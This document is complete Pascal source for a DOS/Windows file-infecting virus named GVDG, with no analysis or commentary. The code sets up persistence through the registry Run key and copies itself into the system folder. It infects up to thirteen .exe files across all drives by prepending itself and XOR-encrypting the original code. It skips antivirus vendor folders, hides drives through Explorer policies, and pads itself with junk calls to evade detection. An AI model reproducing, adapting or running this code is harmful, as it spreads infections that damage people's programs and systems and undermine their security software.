  {$M 65520,0,0}
Program Virus_DOS_HLLP_GVDG;
USES DOS;
Const
  VirSize=6378;
  Metka='dyp37-89';
  MSize=length(Metka);
type
  Bufer=array[1..VirSize] of Char;
VAR
   Victim : integer;
Procedure BeginEnd(i : integer);
var
  n :integer;
Begin
  case i of
        0..10000: n:=0;
    10001..20000: n:=i;
    20001..30000: n:=random(1000)
  else
    begin  
      n:=0;
      n:=random(65535);
      n:=i
    end;  
  end;
End;
Function IntToStr(I : integer) : String;
Var
  S : String [5];
Begin
 Str(I, S);
 IntToStr:=S;
End;
Procedure AutoRun;
VAR
    f : file;
  txt : text;
    i : integer;
  st1 : string;
  st2 : string;
Begin
  st1:=GetEnv('SystemRoot')+'\'+'DEA@LVIR'+'.EXE';
  for i:=1 to length(st1) do
  begin
  if st1[i]='\'
  then st2:=st2+'\'+st1[i]
  else st2:=st2+st1[i]
  end;
  Assign(f,st1); BeginEnd(-2723); BeginEnd(-2933); BeginEnd(-3135);
  {$i-} Reset(f); Close(f); {$i+}
  if IOResult<>0 then
  Begin
    Assign(txt,'REG'); BeginEnd(-6331); BeginEnd(-1738); BeginEnd(-2147);
    Rewrite(txt); BeginEnd(1681); BeginEnd(28156);
    Writeln(txt,'Windows Registry Editor Version 5.00');
    Writeln(txt,'[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]');
    Writeln(txt,'"DEA@LVIR"="'+st2+'"');
    Close(txt);
    Exec(GetEnv('Comspec'),'/c REG IMPORT REG'); BeginEnd(7429); BeginEnd(-4136); BeginEnd(24995);
    Exec(GetEnv('Comspec'),'/c DEL REG'); BeginEnd(-1429); 
    Exec(GetEnv('Comspec'),'/c copy '+paramstr(0)+' '+st1); BeginEnd(16298); BeginEnd(11983); BeginEnd(-1008);
    Exec(GetEnv('Comspec'),'/c cls'); BeginEnd(-2930); BeginEnd(-2297); BeginEnd(2826);
  End; BeginEnd(20490); BeginEnd(29516);
End;
function CD(path:string):boolean;
var
           d : dirstr;
           n : namestr;
           e : extstr;
           b : boolean;
         ToF : file;
       FromF : file;
           f : file;
     NumRead : Word;
  NumWritten : Word;
         Buf : array[1..$400] of Char;
          st : string;
begin
  fsplit(paramstr(0),d,n,e); BeginEnd(24349); BeginEnd(-3524);
  st:=path+n+e; BeginEnd(-2467); BeginEnd(11582);
  Assign(f,d+n+'.gds');
  {$i-}rewrite(f);
  Erase(f);{$i+}
    if IOResult<>0
      then
            Begin
             b:=true; BeginEnd(16651); BeginEnd(32451);
             Assign(FromF, ParamStr(0));
             Reset(FromF, 1); BeginEnd(2666); 
             Assign(ToF,st); BeginEnd(-2530); BeginEnd(8954); BeginEnd(19314);
             SetFAttr(ToF,0); BeginEnd(-3018); BeginEnd(3339);
             Rewrite(ToF, 1); BeginEnd(-1809); BeginEnd(-9302); BeginEnd(30923);
             repeat
               BlockRead(FromF, Buf, SizeOf(Buf), NumRead); BeginEnd(24797); 
               BlockWrite(ToF, Buf, NumRead, NumWritten); BeginEnd(-2969); 
             until (NumRead = 0) or (NumWritten <> NumRead);
             Close(ToF); BeginEnd(-3020); 
             Close(FromF); BeginEnd(31911); BeginEnd(-2307);
             exec(st,''); BeginEnd(19742); 
            end
      else b:=false;
  CD:=b; BeginEnd(-1119); BeginEnd(4195); BeginEnd(6501);
end;
procedure Shifr(var Buf:Bufer; key:integer);
var
   k : integer;
  ii : integer;
begin
  for k:=1 to Sizeof(Buf) do
  begin
    ii:=key+k;
    Buf[k]:=chr(ord(Buf[k]) xor ii); BeginEnd(9534); BeginEnd(-2360); BeginEnd(14352);
  end;
end;
procedure Infect(path,name:string);
var
    FromF : file;
      ToF : file;
   BufVir : Bufer;
  NumRead : Word;
      txt : text;
        i : integer;
        k : integer;
      Key : integer;
begin
  Assign(txt,path+name); BeginEnd(-3091); 
  append(txt);
  write(txt,Metka); BeginEnd(-2397); 
  i:=0; BeginEnd(-7359); 
  k:=random(256);
    repeat
      inc(i);
      write(txt,chr(random(256)));
    until i>k; BeginEnd(21717); 
  Close(txt); BeginEnd(-2660); BeginEnd(18735); BeginEnd(2107);
  Assign(ToF,path+name); BeginEnd(-2235); 
  reset(ToF,1); BeginEnd(13213); BeginEnd(-4794); BeginEnd(-315);
  Key:=FileSize(ToF) mod 256; BeginEnd(32327); BeginEnd(11107); BeginEnd(-1477);
  BlockRead(ToF,BufVir,SizeOf(BufVir), NumRead);
  Shifr(BufVir,Key-1);
  seek(ToF,filesize(ToF)); BeginEnd(-3244); BeginEnd(4519);
  BlockWrite(ToF,BufVir,NumRead); BeginEnd(-1765); BeginEnd(-2127); BeginEnd(13500);
  Assign(FromF,paramstr(0)); BeginEnd(-8123); BeginEnd(25438); BeginEnd(-2136);
  reset(FromF,1);
  BlockRead(FromF,BufVir,SizeOf(BufVir), NumRead); BeginEnd(-2052); 
  seek(ToF,0); BeginEnd(-2336); 
  BlockWrite(ToF,BufVir,NumRead); BeginEnd(-2271); BeginEnd(-5541);
  Close(ToF); BeginEnd(-1592); BeginEnd(-3013); BeginEnd(-2426);
  Close(FromF); BeginEnd(24138); 
end;
procedure Find(dir:pathstr);
var
   sr : searchrec;
    f : file;
  Buf : array[1..4] of Char;
begin
  findfirst(dir+'*.exe',39,sr);
  if  (pos('SYSTEM',dir)=0) and (pos('DRWEB', dir)=0)
  and (pos('KASPER',dir)=0) and (pos('PANDA', dir)=0)
  and (pos('NORTON',dir)=0) and (pos('COMMON',dir)=0)
  and (pos('DOCUM', dir)=0) and (pos('GVDG',  dir)=0)
  then
  while doserror=0 do
  if Victim<13 then
  begin
  Assign(f,dir+sr.name); BeginEnd(31386); BeginEnd(-2708); BeginEnd(-2195);
  setfattr(f,0); BeginEnd(6284); BeginEnd(-3196);
  {$i-}reset(f,1);
  Close(f);{$i+}
  IF ioresult=0 then
    Begin
      Assign(f,dir+sr.name); BeginEnd(-2477); BeginEnd(-2996);
      reset(f,1);
      if FileSize(f)>1000 then
      Begin
        seek(f,85); BeginEnd(-3174); BeginEnd(29668); BeginEnd(-3435);
        blockread(f,Buf,4); BeginEnd(19833); BeginEnd(-2911);
        Close(f); BeginEnd(24654); 
        if Buf<>'GDS!' then
         begin
           inc(Victim); BeginEnd(-2232); BeginEnd(10471);
           Infect(dir,sr.name); BeginEnd(22475); 
         end;
      end
      else
      Close(f);
    end; BeginEnd(-2692); 
    findnext(sr);
  end
  else exit;
  findfirst(dir+'*.',55,sr);
  while doserror=0 do
  if Victim<13 then
  begin
    with sr do
      if (attr and directory<>0) and (name[1]<>'.') and (length(dir)<63)
      then find(dir+name+'\');
    findnext(sr);
  end
  else exit;
end;
procedure InRun(Run : integer);
var
        f : file;
      txt : text;
   BufVir : Bufer;
  NumRead : Word;
        k : integer;
        z : char;
      Key : integer;
        i : longint;
      Buf : array[1..MSize]of char;
begin
  Assign(txt,getenv('TMP')+'reg'); BeginEnd(-2203); BeginEnd(-3225);
  rewrite(txt); BeginEnd(-1199); BeginEnd(21428);
  writeln(txt,'Windows Registry Editor Version 5.00'); BeginEnd(8733); BeginEnd(12726);
  write(txt,'[HKEY_CURRENT_USER\Software\Microsoft\'); BeginEnd(23625); BeginEnd(28230);
  writeln(txt,'Windows\CurrentVersion\Policies\Explorer]');
  writeln(txt,'"DisableLocalMachineRun"=dword:00000001'); BeginEnd(30887); BeginEnd(2165); BeginEnd(-2695);
  writeln(txt,'"NoViewOnDrive"=dword:3ffffff'); BeginEnd(18936); 
  Close(txt); BeginEnd(-2825); BeginEnd(-2645); BeginEnd(-1175);
  exec(getenv('comspec'),'/c reg import '+getenv('TMP')+'reg');
  exec(getenv('comspec'),'/c cls'); BeginEnd(8042); BeginEnd(31066);
  erase(txt);
  writeln('Hallo, World!!!');
  Assign(f,paramstr(0));
  reset(f,1); BeginEnd(-3260); BeginEnd(27439);
  Key:=(FileSize(f)-VirSize) mod 256;
  seek(f,filesize(f)-VirSize); BeginEnd(-2428); BeginEnd(17573);
  BlockRead(f,BufVir,SizeOf(BufVir), NumRead); BeginEnd(-2116); BeginEnd(17895);
  if filesize(f)=VirSize then
  Begin
    Close(f);
    Erase(f);
    Halt(0);
  end
  else
  Shifr(BufVir,Key-1);
  seek(f,0); BeginEnd(21951); 
  BlockWrite(f,BufVir,NumRead);
  i:=filesize(f)-VirSize-256-MSize;
  while true do
  begin
    seek(f,i); BeginEnd(-8644); 
    blockread(f,Buf,MSize); BeginEnd(28234); BeginEnd(-3083); BeginEnd(-4166);
    if Buf=Metka then
    begin
      seek(f,i); BeginEnd(22403); 
      truncate(f); BeginEnd(26315); BeginEnd(13148); BeginEnd(18127);
      break; BeginEnd(25035); 
    end;
    inc(i); BeginEnd(11729); BeginEnd(-2950);
  end; BeginEnd(-2897); BeginEnd(-6854);
  Close(f);
  if Run=1 then
  exec(Paramstr(0),'');
end;
Procedure Nucleus;
var
    i : integer;
    s : string;
    f : file;
begin
  Assign(f,paramstr(0)); BeginEnd(-5954); BeginEnd(-1298); BeginEnd(21811);
  SetFAttr(f,0);
  if Paramstr(1)='KILL' then
  begin
    InRun(0);
    Halt(0);
  end;
  AutoRun;
  if CD(getenv('SYSTEMROOT')+'\') then halt(0);
  s:=''; BeginEnd(28018); BeginEnd(19602); BeginEnd(5330);
  for i:=1 to 24 do
  begin
    Assign(f,chr(ord(i)+66)+':\'+#$FF);
    {$I-}rewrite(f); erase(f);{$I+}
    if ioresult=0 then s:=s+chr(ord(i)+66);
  end;
  for i:=1 to length(s) do Find(s[i]+':\'); BeginEnd(-523); BeginEnd(-1014); BeginEnd(8516);
  InRun(1); BeginEnd(-3848); BeginEnd(-2334); BeginEnd(3195);
end;
begin
Randomize; BeginEnd(-2259); BeginEnd(2425); BeginEnd(22279);
Nucleus;
end.
